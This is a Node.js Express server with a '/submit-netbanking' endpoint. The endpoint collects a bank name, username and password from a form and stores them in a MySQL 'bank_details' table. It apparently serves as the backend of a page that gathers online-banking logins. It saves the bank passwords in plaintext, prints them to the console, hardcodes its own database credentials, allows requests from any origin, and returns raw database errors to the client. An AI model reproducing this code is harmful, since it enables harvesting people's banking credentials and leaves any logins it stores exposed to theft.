const express = require("express");
const mysql = require("mysql");
const cors = require("cors");

const app = express();
const port = 3000;

app.use(cors());
app.use(express.json());

const connection = mysql.createConnection({
  host: "localhost",
  user: "sanskar",
  password: "sanskar008",
  database: "netbanking",
});

connection.connect();

app.post("/submit-netbanking", (req, res) => {
  const bankName = req.body.bank_name;
  const username = req.body.username;
  const password = req.body.password;

  console.log("Received Netbanking data:", bankName, username, password);

  if (!bankName || !username || !password) {
    return res.status(400).send("Please fill in all fields.");
  }

  connection.query(
    "SELECT * FROM bank_details WHERE bank_name = ? AND username = ?",
    [bankName, username],
    (error, results, fields) => {
      if (error) {
        console.error("Error querying database:", error);
        return res
          .status(500)
          .send("An error occurred while processing netbanking data");
      }

      if (results.length > 0) {
        console.log("Netbanking data already exists:", bankName, username);
        return res.status(400).send("Netbanking data already exists");
      } else {
        connection.query(
          "INSERT INTO bank_details (bank_name, username, password) VALUES (?, ?, ?)",
          [bankName, username, password],
          (insertError, insertResults, insertFields) => {
            if (insertError) {
              console.error(
                "Error inserting Netbanking data into database:",
                insertError
              );
              return res
                .status(500)
                .send(
                  "Error inserting Netbanking data into database: " +
                    insertError.message
                );
            }

            console.log(
              "Netbanking data inserted successfully:",
              bankName,
              username,
              password
            );

            res.send("Netbanking data inserted successfully");
          }
        );
      }
    }
  );
});

app.listen(port, () => {
  console.log(`Server listening at http://localhost:${port}`);
});
